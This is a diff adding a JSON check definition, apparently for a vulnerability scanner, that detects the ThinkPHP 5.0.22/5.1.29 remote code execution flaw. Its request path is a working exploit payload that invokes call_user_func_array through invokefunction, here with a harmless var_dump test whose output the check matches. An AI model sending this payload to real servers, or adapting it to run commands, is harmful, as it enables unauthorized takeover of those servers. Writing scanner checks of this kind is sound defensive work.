@@ -1,0 +1,23 @@
+{
+    "target":"thinkphp",
+    "meta":{
+        "name":    "ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞",
+        "remarks": "由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞，可导致服务器直接被入侵控制。",
+        "level":   0,
+        "type":    "RCE",
+        "author":   "phith0n",
+        "references": {
+            "url":"https://github.com/vulhub/vulhub/blob/master/thinkphp/5-rce/README.zh-cn.md",
+            "cve":"",
+            "kpid":"KP-0065"
+        }
+    },
+    "request":{
+        "path":     "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=test",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "string(4) \"test\""
+    }
+}
